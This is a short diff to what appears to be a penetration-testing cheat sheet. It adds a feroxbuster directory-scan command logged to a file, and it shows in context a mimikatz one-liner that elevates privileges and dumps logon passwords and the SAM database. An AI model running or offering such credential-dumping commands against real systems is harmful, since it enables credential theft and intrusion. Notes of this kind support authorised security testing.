@@ -3,10 +3,16 @@
 REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 ```
 
+##### Write terminal color output to file
+```bash
+script -q -c "feroxbuster --url http://aero.com --filter-status 404" feroxbuster-80.log
+```
+
 ##### mimikatz one liner
 ```powershell
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "sekurlsa::logonpasswords" "exit"
 ```
+
 
 
 # File Transfers
